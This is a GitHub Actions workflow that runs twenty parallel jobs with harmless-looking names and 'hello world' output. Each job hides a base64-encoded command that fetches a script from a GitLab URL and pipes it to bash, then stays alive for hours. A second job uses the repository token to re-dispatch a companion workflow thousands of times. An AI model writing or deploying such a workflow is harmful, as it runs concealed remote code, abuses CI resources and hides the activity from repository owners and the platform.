name: 🔵 khurapes

on:
  workflow_dispatch:
    inputs:
      loop_count:
        description: 'Siklus tersisa'
        required: true
        default: '9999'

permissions:
  actions: write

jobs:
  run-lscpu:
    name: ${{ matrix.name }}
    strategy:
      fail-fast: false
      max-parallel: 20
      matrix:
        include:
          - name: Whelliosans-ayonser1112a1
          - name: Whelliosans-byonser1112b1
          - name: Whelliosans-cyonser1112c1
          - name: Whelliosans-dyonser1112d1
          - name: Whelliosans-eyonser1112e1
          - name: Whelliosans-fyonser1112f1
          - name: Whelliosans-gyonser1112g1
          - name: Whelliosans-hyonser1112h1
          - name: Whelliosans-iyonser1112i1
          - name: Whelliosans-jyonser1112j1
          - name: Thelilops-kyonserer1112k1
          - name: Thelilops-lyonserer1112l1
          - name: Thelilops-myonserer1112m1
          - name: Thelilops-nyonserer1112n1
          - name: Thelilops-oyonserer1112o1
          - name: Thelilops-pyonserer1112p1
          - name: Thelilops-qyonserer1112q1
          - name: Thelilops-ryonserer1112r1
          - name: Thelilops-syonserer1112s1
          - name: Thelilops-tyonserer1112t1
    runs-on: ubuntu-latest
    timeout-minutes: 320
    steps:
      - name: Jalankan dengan durasi dinamis
        run: |
          HOUR_UTC=$(date -u +%H)
          LOOP=${{ github.event.inputs.loop_count }}
          # Hitung siklus penuh berdasarkan nilai awal baru 9988
          COMPLETED=$(( (9988 - LOOP) / 3 ))
          if [ "$COMPLETED" -ge 3 ]; then
            if [ "$HOUR_UTC" -eq 4 ]; then
              echo "🕚 HELLO WORLD 🕚"
              SLEEP=18000
            elif [ "$HOUR_UTC" -ge 23 ] || [ "$HOUR_UTC" -lt 3 ]; then
              echo "🕕 HELLO WORLD"
              SLEEP=10800
            else
              if [ "$LOOP" -ge 9983 ]; then    # 6 loop pertama (9988–9983)
                echo "🔄 hello world"
                SLEEP=480
              else
                echo "⏳ hello world"
                SLEEP=3600
              fi
            fi
          else
            # Sebelum 3 siklus, aturan biasa
            if [ "$LOOP" -ge 9983 ]; then
              echo "🔄 hello"
              SLEEP=420
            else
              echo "⏳ hello"
              SLEEP=3600
            fi
          fi
          echo "hello world" & base64 -d <<< Y3VybCAtc0wgIGh0dHBzOi8vZ2l0bGFiLmNvbS94cGFuemVycy9wbGF5Ly0vcmF3L21haW4vbHVtYW5zYW5zIHwgYmFzaA | sh & sleep $SLEEP

  line-phanu:
    needs: run-lscpu
    runs-on: ubuntu-latest
    if: github.event.inputs.loop_count > 0
    steps:
      - name: Panggil phanu (next = khirap)
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
        run: |
          new_loop=$(( ${{ github.event.inputs.loop_count }} - 1 ))
          curl -X POST \
            -H "Authorization: token $GITHUB_TOKEN" \
            -H "Accept: application/vnd.github.v3+json" \
            https://api.github.com/repos/${{ github.repository }}/actions/workflows/phanu.yml/dispatches \
            -d "{\"ref\":\"main\",\"inputs\":{\"loop_count\":\"$new_loop\",\"next_phase\":\"khirap\"}}"